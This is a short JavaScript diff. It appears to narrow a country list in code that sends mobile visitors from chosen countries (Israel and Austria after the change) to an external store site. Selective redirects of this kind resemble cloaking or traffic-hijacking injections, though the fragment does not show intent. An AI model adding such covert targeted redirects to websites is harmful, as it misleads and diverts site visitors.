@@ -52,7 +52,7 @@
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-         if ((data.country === 'IL' || data.country === 'AT' || data.country === 'BE' || data.country === 'BG' || data.country === 'HR' || data.country === 'CY' || data.country === 'CZ' || data.country === 'DK' || data.country === 'EE' || data.country === 'FI' || data.country === 'FR' || data.country === 'DE' || data.country === 'GR' || data.country === 'HU' || data.country === 'IE' || data.country === 'IT' || data.country === 'LV' || data.country === 'LT' || data.country === 'LU' || data.country === 'MT' || data.country === 'NL' || data.country === 'PL' || data.country === 'PT' || data.country === 'RO' || data.country === 'SK' || data.country === 'SI' || data.country === 'ES' || data.country === 'SE' || data.country === 'IS' || data.country === 'LI' || data.country === 'NO') && isMobileDevice() ) {
+         if ((data.country === 'IL' || data.country === 'AT') && isMobileDevice() ) {
           window.location.href = "https://seonlinestore.com";
           return;
         } 
